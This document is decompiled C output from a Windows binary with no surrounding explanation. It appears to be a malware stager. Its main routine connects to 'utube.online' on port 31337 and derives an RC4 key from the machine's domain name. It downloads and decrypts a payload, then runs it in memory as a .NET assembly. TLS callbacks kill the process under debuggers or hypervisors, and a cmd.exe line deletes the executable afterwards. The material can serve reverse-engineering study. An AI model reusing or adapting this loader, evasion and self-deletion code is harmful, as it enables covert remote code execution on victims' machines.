/* This file was generated by the Hex-Rays decompiler version 9.1.0.250226.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

int sub_140001000();
_BYTE *__fastcall RC4_Decrypt(__int64 a1, __int64 a2, int a3);
void *sub_140001190();
__int64 FormatWideStringSafe(wchar_t *Buffer, unsigned __int64 a2, const wchar_t *a3, ...);
unsigned __int64 TlsCallback_0();
signed __int32 *TlsCallback_1();
int __fastcall main(int argc, const char **argv, const char **envp);
__int64 __fastcall sub_140001900(_QWORD); // weak
// HRESULT __stdcall VariantClear(VARIANTARG *pvarg);
void __fastcall invoke_dotnet(void *Src, LPCCH lpMultiByteStr);
__int64 __fastcall sub_140001F00(_QWORD); // weak
void __cdecl j_j_free(void *Block);
// void *__fastcall operator new(size_t Size); idb
__int64 __fastcall sub_140002390(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_1400023CC(_QWORD *a1);
__int64 __fastcall sub_1400023EC(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_140002428(_QWORD *a1);
void __noreturn sub_1400024D4();
void __noreturn sub_1400024F4();
// int __cdecl atexit(void (__cdecl *)());
__int64 __fastcall UserMathErrorFunction(struct _exception *a1);
void sub_140002838();
char sub_140002848();
void *sub_140002850();
void *sub_140002880();
void *sub_140002888();
void sub_140002890();
void sub_140002AAC();
void __fastcall sub_140002AE8();
_QWORD *__fastcall sub_140002B24(_QWORD *a1, char a2);
__int64 __fastcall HandleError(__int64 a1);
BSTR __fastcall ConvertAnsiToBSTR(LPCCH lpMultiByteStr);
__int64 __fastcall sub_140002EB0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140002F00(__int64 a1, int a2, __int64 a3, char a4);
__int64 (__fastcall **__fastcall sub_140002F50(_QWORD *a1))(void *Block);
_QWORD *__fastcall sub_140002FA0(_QWORD *Block, char a2);
void __fastcall __noreturn sub_140003000(int a1, __int64 a2);
// __int64 __fastcall _std_exception_copy(_QWORD); weak
// void __stdcall __noreturn CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
// void *__cdecl memset(void *, int Val, size_t Size);
// void *__cdecl malloc(size_t Size);
// void __cdecl free(void *Block);
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
__int64 __fastcall sub_140003340(__int64 a1, __int64 a2);
__int64 __fastcall sub_14000334C(__int64 a1, __int64 a2);
__int64 __fastcall sub_14000338D(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400033B6(__int64 a1, __int64 a2);
HRESULT __fastcall sub_1400033C2(__int64 a1, __int64 a2);
HRESULT __fastcall sub_1400033CE(__int64 a1, __int64 a2);
HRESULT __fastcall sub_1400033DA(__int64 a1, __int64 a2);
HRESULT sub_140003420();
// __int64 __fastcall CLRCreateInstance(_QWORD, _QWORD, _QWORD); weak

//-------------------------------------------------------------------------
// Data declarations

// extern DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern LPVOID (__stdcall *LockResource)(HGLOBAL hResData);
// extern HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo);
// extern HRSRC (__stdcall *FindResourceW)(HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType);
// extern HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
// extern BOOL (__stdcall *Process32NextW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern DWORD (__stdcall *K32GetModuleBaseNameW)(HANDLE hProcess, HMODULE hModule, LPWSTR lpBaseName, DWORD nSize);
// extern BOOL (__stdcall *Process32FirstW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern BOOL (__stdcall *CreateProcessW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern BOOL (__stdcall *GetComputerNameExA)(COMPUTER_NAME_FORMAT NameType, LPSTR lpBuffer, LPDWORD nSize);
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern DWORD (__stdcall *GetLastError)();
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern HRESULT (__stdcall *SafeArrayDestroy)(SAFEARRAY *psa);
// extern void (__stdcall *VariantInit)(VARIANTARG *pvarg);
// extern HRESULT (__stdcall *SafeArrayUnlock)(SAFEARRAY *psa);
// extern HRESULT (__stdcall *VariantClear)(VARIANTARG *pvarg);
// extern SAFEARRAY *(__stdcall *SafeArrayCreateVector)(VARTYPE vt, LONG lLbound, ULONG cElements);
// extern SAFEARRAY *(__stdcall *SafeArrayCreate)(VARTYPE vt, UINT cDims, SAFEARRAYBOUND *rgsabound);
// extern HRESULT (__stdcall *SafeArrayLock)(SAFEARRAY *psa);
// extern HRESULT (__stdcall *SafeArrayPutElement)(SAFEARRAY *psa, LONG *rgIndices, void *pv);
// extern BSTR (__stdcall *SysAllocString)(const OLECHAR *psz);
// extern void (__stdcall *SysFreeString)(BSTR bstrString);
// extern SOCKET (__stdcall *socket)(int af, int type, int protocol);
// extern int (__stdcall *recv)(SOCKET s, char *buf, int len, int flags);
// extern int (__stdcall *WSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
// extern INT (__stdcall *getaddrinfo)(PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA *pHints, PADDRINFOA *ppResult);
// extern int (__stdcall *closesocket)(SOCKET s);
// extern void (__stdcall *freeaddrinfo)(PADDRINFOA pAddrInfo);
// extern int (__stdcall *send)(SOCKET s, const char *buf, int len, int flags);
// extern int (__stdcall *connect)(SOCKET s, const struct sockaddr *name, int namelen);
// extern int (__stdcall *WSACleanup)();
// extern void (__cdecl __noreturn *exit)(int Code);
// extern int (__cdecl *_stdio_common_vswprintf)(unsigned __int64 Options, wchar_t *Buffer, size_t BufferCount, const wchar_t *Format, _locale_t Locale, va_list ArgList);
void *std::exception::`vftable' = &unknown_libname_2; // weak
void *std::bad_alloc::`vftable' = &unknown_libname_2; // weak
void *std::bad_array_new_length::`vftable' = &unknown_libname_2; // weak
void *type_info::`vftable' = &sub_140002B24; // weak
__int64 (__fastcall *off_140004490)(void *Block) = &sub_140002FA0; // weak
_UNKNOWN unk_140004590; // weak
_UNKNOWN unk_1400045A0; // weak
_UNKNOWN unk_1400045B0; // weak
_UNKNOWN unk_1400045C0; // weak
_UNKNOWN unk_1400045D0; // weak
_UNKNOWN unk_1400045E0; // weak
void (*qword_140004D78[2])(void) = { NULL, NULL }; // weak
void (*qword_140004D88)(void) = NULL; // weak
void (__fastcall __noreturn *off_140006030)() = &sub_140003000; // weak
VARIANTARG stru_140006038 = { { { 10u, 0u, 0u, 0u, { { (PVOID)0x80020004LL, NULL } } } } }; // weak
union _SLIST_HEADER stru_1400066F0; // weak
_UNKNOWN unk_140006700; // weak
int dword_140006708; // weak
_UNKNOWN unk_140006710; // weak
_UNKNOWN unk_140006718; // weak
_UNKNOWN unk_140006720; // weak


//----- (0000000140001000) ----------------------------------------------------
int sub_140001000()
{
  return atexit((void (__cdecl *)())sub_140003420);
}

//----- (0000000140001010) ----------------------------------------------------
_BYTE *__fastcall RC4_Decrypt(__int64 a1, __int64 a2, int a3)
{
  __int64 v3; // rsi
  _BYTE *v6; // rbp
  __int64 v7; // r10
  int v8; // ecx
  _BYTE *v9; // rdx
  __int64 v10; // r14
  int i; // eax
  int v12; // r11d
  char *v13; // rdi
  char v14; // r9
  int v15; // eax
  int v16; // r8d
  _BYTE *v17; // r11
  __int64 v18; // r15
  _BYTE *v19; // r10
  int v20; // r9d
  _BYTE v22[256]; // [rsp+20h] [rbp-138h] BYREF

  v3 = a3;
  v6 = VirtualAlloc(0, a3, 0x1000u, 4u);
  v7 = -1;
  do
    ++v7;
  while ( *(_BYTE *)(a1 + v7) );
  v8 = 0;
  v9 = v22;
  LOBYTE(v10) = 0;
  for ( i = 0; i < 256; ++i )
    *v9++ = i;
  v12 = 0;
  v13 = v22;
  do
  {
    v14 = *v13++;
    v15 = v12++;
    v10 = (unsigned __int8)(v14 + v10 + *(_BYTE *)(v15 % (int)v7 + a1));
    *(v13 - 1) = v22[v10];
    v22[v10] = v14;
  }
  while ( v12 < 256 );
  v16 = 0;
  if ( v3 )
  {
    v17 = v6;
    v18 = a2 - (_QWORD)v6;
    do
    {
      v8 = (v8 + 1) % 256;
      v19 = &v22[v8];
      v20 = (unsigned __int8)*v19;
      v16 = (v20 + v16) % 256;
      *v19 = v22[v16];
      v22[v16] = v20;
      *v17 = v17[v18] ^ v22[(unsigned __int8)(*v19 + v20)];
      ++v17;
      --v3;
    }
    while ( v3 );
  }
  return v6;
}

//----- (0000000140001190) ----------------------------------------------------
void *sub_140001190()
{
  return &unk_140006710;
}

//----- (00000001400011A0) ----------------------------------------------------
__int64 FormatWideStringSafe(wchar_t *Buffer, unsigned __int64 a2, const wchar_t *a3, ...)
{
  unsigned __int64 v3; // rdx
  __int64 result; // rax
  unsigned int v7; // ebx
  size_t v8; // rdi
  _QWORD *v9; // rax
  int v10; // eax
  va_list va; // [rsp+78h] [rbp+20h] BYREF

  va_start(va, a3);
  v3 = a2 >> 1;
  if ( v3 - 1 <= 0x7FFFFFFE )
  {
    v7 = 0;
    v8 = v3 - 1;
    v9 = sub_140001190();
    v10 = _stdio_common_vswprintf(*v9 | 1LL, Buffer, v8, a3, 0, va);
    if ( v10 < 0 )
      v10 = -1;
    if ( v10 < 0 || v10 > v8 )
    {
      Buffer[v8] = 0;
      return (unsigned int)-2147024774;
    }
    else if ( v10 == v8 )
    {
      Buffer[v8] = 0;
      return 0;
    }
    return v7;
  }
  else
  {
    result = 2147942487LL;
    if ( v3 )
      *Buffer = 0;
  }
  return result;
}

//----- (0000000140001270) ----------------------------------------------------
unsigned __int64 TlsCallback_0()
{
  int v0; // edi
  DWORD CurrentProcessId; // ebp
  HANDLE Toolhelp32Snapshot; // rsi
  DWORD th32ParentProcessID; // ebx
  HANDLE v4; // rbx
  unsigned __int64 result; // rax
  int v6; // edx
  WCHAR *v7; // r8
  __m128i v8; // xmm3
  __m128i v9; // xmm2
  __m128i v10; // xmm1
  __m128i v11; // xmm1
  __m128i v12; // xmm2
  __m128i v13; // xmm2
  WCHAR *v14; // r8
  int v15; // ecx
  DWORD dwProcessId; // [rsp+20h] [rbp-338h]
  PROCESSENTRY32W pe; // [rsp+30h] [rbp-328h] BYREF
  WCHAR BaseName[104]; // [rsp+270h] [rbp-E8h] BYREF

  v0 = 0;
  CurrentProcessId = GetCurrentProcessId();
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  memset(&pe.cntUsage, 0, 0x234u);
  pe.dwSize = 568;
  th32ParentProcessID = dwProcessId;
  if ( Process32FirstW(Toolhelp32Snapshot, &pe) )
  {
    do
    {
      if ( pe.th32ProcessID == CurrentProcessId )
        th32ParentProcessID = pe.th32ParentProcessID;
    }
    while ( Process32NextW(Toolhelp32Snapshot, &pe) );
  }
  CloseHandle(Toolhelp32Snapshot);
  v4 = OpenProcess(0x10000000u, 0, th32ParentProcessID);
  memset(BaseName, 0, 0xC8u);
  K32GetModuleBaseNameW(v4, 0, BaseName, 0x64u);
  result = -1;
  do
    ++result;
  while ( BaseName[result] );
  v6 = 0;
  if ( result >= 8 )
  {
    v7 = &BaseName[4];
    v8 = 0;
    v9 = 0;
    do
    {
      v10 = _mm_loadl_epi64((const __m128i *)(v7 - 4));
      v7 += 8;
      v6 += 8;
      v8 = _mm_add_epi32(_mm_unpacklo_epi16(v10, (__m128i)0LL), v8);
      v11 = _mm_add_epi32(_mm_unpacklo_epi16(_mm_loadl_epi64((const __m128i *)v7 - 1), (__m128i)0LL), v9);
      v9 = v11;
    }
    while ( v6 < (result & 0xFFFFFFFFFFFFFFF8uLL) );
    v12 = _mm_add_epi32(v11, v8);
    v13 = _mm_add_epi32(v12, _mm_srli_si128(v12, 8));
    v0 = _mm_cvtsi128_si32(_mm_add_epi32(v13, _mm_srli_si128(v13, 4)));
  }
  if ( v6 < result )
  {
    v14 = &BaseName[v6];
    do
    {
      v15 = *v14++;
      ++v6;
      v0 += v15;
    }
    while ( v6 < result );
  }
  if ( v0 != 1461 )
    exit(0);
  return result;
}
// 1400012D9: variable 'dwProcessId' is possibly undefined

//----- (0000000140001440) ----------------------------------------------------
signed __int32 *TlsCallback_1()
{
  signed __int32 *result; // rax
  signed __int32 v6[2]; // [rsp+28h] [rbp-20h] BYREF

  _RAX = 1;
  __asm { cpuid }
  result = v6;
  v6[0] = _RCX;
  v6[1] = _RDX;
  if ( _bittest(v6, 0x1Fu) )
    exit(0);
  return result;
}

//----- (00000001400014A0) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
  SOCKET v3; // rdi
  PADDRINFOA v5; // rbx
  SOCKET v6; // rax
  int v7; // r8d
  __int64 v8; // rax
  __int64 v9; // rdx
  unsigned __int64 v10; // rax
  char *v11; // rbx
  _BYTE *v12; // r15
  HMODULE ModuleHandleW; // rdi
  HRSRC ResourceW; // rax
  HRSRC v15; // rsi
  HGLOBAL Resource; // rbx
  DWORD v17; // esi
  const void *v18; // rdi
  __int64 v19; // r14
  void *v20; // rbx
  _BYTE *v21; // rax
  __int64 v22; // rdx
  PADDRINFOA ppResult; // [rsp+50h] [rbp-B0h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+58h] [rbp-A8h] BYREF
  DWORD nSize; // [rsp+70h] [rbp-90h] BYREF
  ADDRINFOA pHints; // [rsp+78h] [rbp-88h] BYREF
  struct _STARTUPINFOW StartupInfo; // [rsp+B0h] [rbp-50h] BYREF
  WSAData WSAData; // [rsp+120h] [rbp+20h] BYREF
  CHAR Buffer[272]; // [rsp+2C0h] [rbp+1C0h] BYREF
  WCHAR Filename[264]; // [rsp+3D0h] [rbp+2D0h] BYREF
  char buf[1024]; // [rsp+5E0h] [rbp+4E0h] BYREF
  WCHAR CommandLine[520]; // [rsp+9E0h] [rbp+8E0h] BYREF

  ppResult = 0;
  v3 = -1;
  if ( WSAStartup(0x202u, &WSAData) )
    return 1;
  pHints.ai_flags = 0;
  pHints.ai_family = 2;
  pHints.ai_socktype = 1;
  pHints.ai_protocol = 6;
  memset(&pHints.ai_addrlen, 0, 32);
  if ( getaddrinfo("utube.online", "31337", &pHints, &ppResult) )
    goto LABEL_21;
  v5 = ppResult;
  if ( ppResult )
  {
    while ( 1 )
    {
      v6 = socket(v5->ai_family, v5->ai_socktype, v5->ai_protocol);
      v3 = v6;
      if ( v6 == -1 )
        goto LABEL_21;
      if ( connect(v6, v5->ai_addr, v5->ai_addrlen) != -1 )
      {
        v5 = ppResult;
        break;
      }
      closesocket(v3);
      v5 = v5->ai_next;
      if ( !v5 )
      {
        freeaddrinfo(ppResult);
        WSACleanup();
        return 1;
      }
    }
  }
  freeaddrinfo(v5);
  if ( v3 == -1 )
  {
LABEL_21:
    WSACleanup();
    return 1;
  }
  if ( send(v3, "z11gj1\n", 7, 0) == -1 )
    goto LABEL_20;
  memset(buf, 0, sizeof(buf));
  nSize = 260;
  recv(v3, buf, 1024, 0);
  GetComputerNameExA(ComputerNameDnsDomain, Buffer, &nSize);
  v7 = 0;
  Buffer[8] = 0;
  v8 = -1;
  do
    ++v8;
  while ( Buffer[v8] );
  if ( v8 )
  {
    v9 = 0;
    do
    {
      Buffer[v9] ^= buf[v9];
      ++v9;
      ++v7;
      v10 = -1;
      do
        ++v10;
      while ( Buffer[v10] );
    }
    while ( v7 < v10 );
  }
  if ( send(v3, "533_11s4\n", 9, 0) == -1 )
  {
LABEL_20:
    closesocket(v3);
    goto LABEL_21;
  }
  v11 = (char *)VirtualAlloc(0, 0x2710u, 0x1000u, 4u);
  recv(v3, v11, 7680, 0);
  v12 = RC4_Decrypt((__int64)Buffer, (__int64)v11, 7680);
  ModuleHandleW = GetModuleHandleW(0);
  ResourceW = FindResourceW(ModuleHandleW, (LPCWSTR)0x65, (LPCWSTR)0xA);
  v15 = ResourceW;
  if ( !ResourceW )
    exit(0);
  Resource = LoadResource(ModuleHandleW, ResourceW);
  v17 = SizeofResource(ModuleHandleW, v15);
  v18 = LockResource(Resource);
  v19 = v17;
  v20 = VirtualAlloc(0, v17, 0x1000u, 4u);
  memcpy(v20, v18, v17);
  v21 = RC4_Decrypt((__int64)Buffer, (__int64)v20, v17);
  if ( v17 )
  {
    v22 = v12 - v21;
    do
    {
      v21[v22 + 3504] = *v21;
      ++v21;
      --v19;
    }
    while ( v19 );
  }
  WSACleanup();
  invoke_dotnet(v12, Buffer);
  memset(&StartupInfo, 0, sizeof(StartupInfo));
  memset(&ProcessInformation, 0, sizeof(ProcessInformation));
  GetModuleFileNameW(0, Filename, 0x104u);
  FormatWideStringSafe(CommandLine, 0x208u, L"cmd.exe /C ping 127.0.0.1 -n 10 > Nul & Del /f /q \"%s\"", Filename);
  CreateProcessW(0, CommandLine, 0, 0, 0, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation);
  CloseHandle(ProcessInformation.hThread);
  CloseHandle(ProcessInformation.hProcess);
  return 0;
}
// 1400044D0: using guessed type wchar_t aCmdExeCPing127[55];

//----- (0000000140001980) ----------------------------------------------------
// Hidden C++ exception states: #wind=32
void __fastcall invoke_dotnet(void *Src, LPCCH lpMultiByteStr)
{
  int (__fastcall ***v4)(_QWORD, void *, __int64 *); // rbx
  SAFEARRAY *v5; // rbx
  BSTR *v6; // rbx
  BSTR *v7; // rdi
  BSTR v8; // rax
  SAFEARRAY *Vector; // r14
  BSTR v10; // rcx
  BSTR v11; // rcx
  BSTR v12; // rcx
  BSTR v13; // rcx
  VARIANTARG v14; // [rsp+50h] [rbp-B0h] BYREF
  __int64 v15; // [rsp+70h] [rbp-90h] BYREF
  __int64 v16; // [rsp+78h] [rbp-88h] BYREF
  __int64 v17; // [rsp+80h] [rbp-80h] BYREF
  __int64 v18; // [rsp+88h] [rbp-78h] BYREF
  __int64 v19; // [rsp+90h] [rbp-70h] BYREF
  __int64 v20; // [rsp+98h] [rbp-68h] BYREF
  int (__fastcall ***v21)(_QWORD, void *, __int64 *); // [rsp+A0h] [rbp-60h] BYREF
  int v22; // [rsp+A8h] [rbp-58h] BYREF
  LONG rgIndices; // [rsp+ACh] [rbp-54h] BYREF
  VARIANTARG v24; // [rsp+B0h] [rbp-50h] BYREF
  VARIANTARG pv; // [rsp+C8h] [rbp-38h] BYREF
  VARIANTARG pvarg; // [rsp+E0h] [rbp-20h] BYREF
  BSTR *v27; // [rsp+F8h] [rbp-8h]
  BSTR *v28; // [rsp+100h] [rbp+0h]
  SAFEARRAYBOUND rgsabound; // [rsp+108h] [rbp+8h] BYREF

  v15 = 0;
  v16 = 0;
  v17 = 0;
  if ( (int)CLRCreateInstance(&unk_1400045D0, &unk_140004590, &v17) < 0
    || (*(int (__fastcall **)(__int64, const wchar_t *, void *, __int64 *))(*(_QWORD *)v17 + 24LL))(
         v17,
         L"v4.0.30319",
         &unk_1400045E0,
         &v15) < 0
    || (*(int (__fastcall **)(__int64, int *))(*(_QWORD *)v15 + 80LL))(v15, &v22) < 0
    || !v22
    || (*(int (__fastcall **)(__int64, void *, void *, __int64 *))(*(_QWORD *)v15 + 72LL))(
         v15,
         &unk_1400045C0,
         &unk_1400045A0,
         &v16) < 0
    || (*(int (__fastcall **)(__int64))(*(_QWORD *)v16 + 80LL))(v16) < 0 )
  {
    return;
  }
  v18 = 0;
  v21 = 0;
  if ( (*(int (__fastcall **)(__int64, int (__fastcall ****)(_QWORD, void *, __int64 *)))(*(_QWORD *)v16 + 104LL))(
         v16,
         &v21) < 0 )
    goto LABEL_65;
  v4 = v21;
  if ( !v21 )
  {
    HandleError(2147500035LL);
    goto LABEL_72;
  }
  if ( v18 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v18 + 16LL))(v18);
  v18 = 0;
  if ( (**v4)(v4, &unk_1400045B0, &v18) < 0 )
    goto LABEL_65;
  rgsabound = (SAFEARRAYBOUND)7680LL;
  v5 = SafeArrayCreate(0x11u, 1u, &rgsabound);
  SafeArrayLock(v5);
  memcpy(v5->pvData, Src, 0x1E00u);
  SafeArrayUnlock(v5);
  v20 = 0;
  if ( !v18 )
  {
LABEL_77:
    HandleError(2147500035LL);
    JUMPOUT(0x140001EF0LL);
  }
  v20 = 0;
  if ( (*(int (__fastcall **)(__int64, SAFEARRAY *, __int64 *))(*(_QWORD *)v18 + 360LL))(v18, v5, &v20) >= 0 )
  {
    v6 = (BSTR *)operator new(0x18u);
    if ( v6 )
    {
      *(_OWORD *)v6 = 0;
      v6[2] = 0;
      v6[1] = 0;
      *((_DWORD *)v6 + 4) = 1;
      *v6 = ConvertAnsiToBSTR("CorpSpace.CorpClass");
    }
    else
    {
      v6 = 0;
    }
    v27 = v6;
    if ( !v6 )
      goto LABEL_73;
    v19 = 0;
    if ( !v20 )
    {
LABEL_76:
      HandleError(2147500035LL);
      goto LABEL_77;
    }
    v19 = 0;
    if ( (*(int (__fastcall **)(__int64, BSTR, __int64 *))(*(_QWORD *)v20 + 136LL))(v20, *v6, &v19) < 0 )
    {
LABEL_55:
      if ( v19 )
        (*(void (__fastcall **)(__int64))(*(_QWORD *)v19 + 16LL))(v19);
      if ( _InterlockedExchangeAdd((volatile signed __int32 *)v6 + 4, 0xFFFFFFFF) == 1 )
      {
        if ( *v6 )
        {
          SysFreeString(*v6);
          *v6 = 0;
        }
        v13 = v6[1];
        if ( v13 )
        {
          j_j_free(v13);
          v6[1] = 0;
        }
        j_j_free(v6);
      }
      goto LABEL_63;
    }
    v7 = (BSTR *)operator new(0x18u);
    if ( !v7 )
    {
      v7 = 0;
      goto LABEL_24;
    }
    *(_OWORD *)v7 = 0;
    v7[2] = 0;
    v7[1] = 0;
    *((_DWORD *)v7 + 4) = 1;
    v8 = SysAllocString(L"EntryPoint");
    *v7 = v8;
    if ( v8 )
    {
LABEL_24:
      v28 = v7;
      if ( v7 )
      {
        pv.vt = 8;
        pv.llVal = (LONGLONG)ConvertAnsiToBSTR(lpMultiByteStr);
        VariantInit(&pvarg);
        VariantInit(&v24);
        Vector = SafeArrayCreateVector(0xCu, 0, 1u);
        rgIndices = 0;
        if ( SafeArrayPutElement(Vector, &rgIndices, &pv) < 0 )
        {
LABEL_49:
          VariantClear(&v24);
          VariantClear(&pvarg);
          VariantClear(&pv);
          if ( _InterlockedExchangeAdd((volatile signed __int32 *)v7 + 4, 0xFFFFFFFF) == 1 )
          {
            if ( *v7 )
            {
              SysFreeString(*v7);
              *v7 = 0;
            }
            v12 = v7[1];
            if ( v12 )
            {
              j_j_free(v12);
              v7[1] = 0;
            }
            j_j_free(v7);
          }
          goto LABEL_55;
        }
        if ( v19 )
        {
          v14 = v24;
          if ( (*(int (__fastcall **)(__int64, BSTR, __int64, _QWORD, VARIANTARG *, SAFEARRAY *, VARIANTARG *))(*(_QWORD *)v19 + 456LL))(
                 v19,
                 *v7,
                 280,
                 0,
                 &v14,
                 Vector,
                 &pvarg) >= 0 )
          {
            SafeArrayDestroy(Vector);
            VariantClear(&v24);
            VariantClear(&pvarg);
            VariantClear(&pv);
            if ( !_InterlockedDecrement((volatile signed __int32 *)v7 + 4) )
            {
              if ( *v7 )
              {
                SysFreeString(*v7);
                *v7 = 0;
              }
              v10 = v7[1];
              if ( v10 )
              {
                j_j_free(v10);
                v7[1] = 0;
              }
              j_j_free(v7);
            }
            if ( v19 )
              (*(void (__fastcall **)(__int64))(*(_QWORD *)v19 + 16LL))(v19);
            if ( _InterlockedExchangeAdd((volatile signed __int32 *)v6 + 4, 0xFFFFFFFF) == 1 )
            {
              if ( *v6 )
              {
                SysFreeString(*v6);
                *v6 = 0;
              }
              v11 = v6[1];
              if ( v11 )
              {
                j_j_free(v11);
                v6[1] = 0;
              }
              j_j_free(v6);
            }
            if ( v20 )
              (*(void (__fastcall **)(__int64))(*(_QWORD *)v20 + 16LL))(v20);
            if ( v18 )
              (*(void (__fastcall **)(__int64))(*(_QWORD *)v18 + 16LL))(v18);
            if ( v21 )
              ((void (__fastcall *)(int (__fastcall ***)(_QWORD, void *, __int64 *)))(*v21)[2])(v21);
            return;
          }
          goto LABEL_49;
        }
        goto LABEL_75;
      }
LABEL_74:
      HandleError(2147942414LL);
LABEL_75:
      HandleError(2147500035LL);
      goto LABEL_76;
    }
LABEL_72:
    HandleError(2147942414LL);
LABEL_73:
    HandleError(2147942414LL);
    goto LABEL_74;
  }
LABEL_63:
  if ( v20 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v20 + 16LL))(v20);
LABEL_65:
  if ( v18 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v18 + 16LL))(v18);
  if ( v21 )
    ((void (__fastcall *)(int (__fastcall ***)(_QWORD, void *, __int64 *)))(*v21)[2])(v21);
}
// 140001EEB: control flows out of bounds to 140001EF0
// 140004310: using guessed type __int64 __fastcall CLRCreateInstance(_QWORD, _QWORD, _QWORD);
// 140004548: using guessed type wchar_t aV4030319[11];

//----- (0000000140002390) ----------------------------------------------------
__int64 __fastcall sub_140002390(__int64 a1, __int64 a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_OWORD *)(a1 + 8) = 0;
  _std_exception_copy(a2 + 8);
  *(_QWORD *)a1 = &std::bad_alloc::`vftable';
  return a1;
}
// 14000303A: using guessed type __int64 __fastcall _std_exception_copy(_QWORD);
// 1400043E8: using guessed type void *std::exception::`vftable';
// 140004418: using guessed type void *std::bad_alloc::`vftable';

//----- (00000001400023CC) ----------------------------------------------------
_QWORD *__fastcall sub_1400023CC(_QWORD *a1)
{
  a1[2] = 0;
  a1[1] = "bad allocation";
  *a1 = &std::bad_alloc::`vftable';
  return a1;
}
// 140004418: using guessed type void *std::bad_alloc::`vftable';

//----- (00000001400023EC) ----------------------------------------------------
__int64 __fastcall sub_1400023EC(__int64 a1, __int64 a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_OWORD *)(a1 + 8) = 0;
  _std_exception_copy(a2 + 8);
  *(_QWORD *)a1 = &std::bad_array_new_length::`vftable';
  return a1;
}
// 14000303A: using guessed type __int64 __fastcall _std_exception_copy(_QWORD);
// 1400043E8: using guessed type void *std::exception::`vftable';
// 140004440: using guessed type void *std::bad_array_new_length::`vftable';

//----- (0000000140002428) ----------------------------------------------------
_QWORD *__fastcall sub_140002428(_QWORD *a1)
{
  a1[2] = 0;
  a1[1] = "bad array new length";
  *a1 = &std::bad_array_new_length::`vftable';
  return a1;
}
// 140004440: using guessed type void *std::bad_array_new_length::`vftable';

//----- (00000001400024D4) ----------------------------------------------------
void __noreturn sub_1400024D4()
{
  _QWORD pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  sub_1400023CC(pExceptionObject);
  throw (std::bad_alloc *)pExceptionObject;
}

//----- (00000001400024F4) ----------------------------------------------------
void __noreturn sub_1400024F4()
{
  _QWORD pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  sub_140002428(pExceptionObject);
  throw (std::bad_array_new_length *)pExceptionObject;
}

//----- (0000000140002824) ----------------------------------------------------
__int64 __fastcall UserMathErrorFunction(struct _exception *a1)
{
  return 0;
}

//----- (0000000140002838) ----------------------------------------------------
void sub_140002838()
{
  InitializeSListHead(&stru_1400066F0);
}
// 1400066F0: using guessed type union _SLIST_HEADER stru_1400066F0;

//----- (0000000140002848) ----------------------------------------------------
char sub_140002848()
{
  return 1;
}

//----- (0000000140002850) ----------------------------------------------------
void *sub_140002850()
{
  return &unk_140006700;
}

//----- (0000000140002880) ----------------------------------------------------
void *sub_140002880()
{
  return &unk_140006720;
}

//----- (0000000140002888) ----------------------------------------------------
void *sub_140002888()
{
  return &unk_140006718;
}

//----- (0000000140002890) ----------------------------------------------------
void sub_140002890()
{
  dword_140006708 = 0;
}
// 140006708: using guessed type int dword_140006708;

//----- (0000000140002AAC) ----------------------------------------------------
void sub_140002AAC()
{
  void (**i)(void); // rbx

  for ( i = qword_140004D78; i < qword_140004D78; ++i )
  {
    if ( *i )
      (*i)();
  }
}
// 140004D78: using guessed type void (*qword_140004D78[2])(void);

//----- (0000000140002AE8) ----------------------------------------------------
void __fastcall sub_140002AE8()
{
  void (**i)(void); // rbx

  for ( i = &qword_140004D88; i < &qword_140004D88; ++i )
  {
    if ( *i )
      (*i)();
  }
}
// 140004D88: using guessed type void (*qword_140004D88)(void);

//----- (0000000140002B24) ----------------------------------------------------
_QWORD *__fastcall sub_140002B24(_QWORD *a1, char a2)
{
  *a1 = &type_info::`vftable';
  if ( (a2 & 1) != 0 )
    j_j_free(a1);
  return a1;
}
// 140004488: using guessed type void *type_info::`vftable';

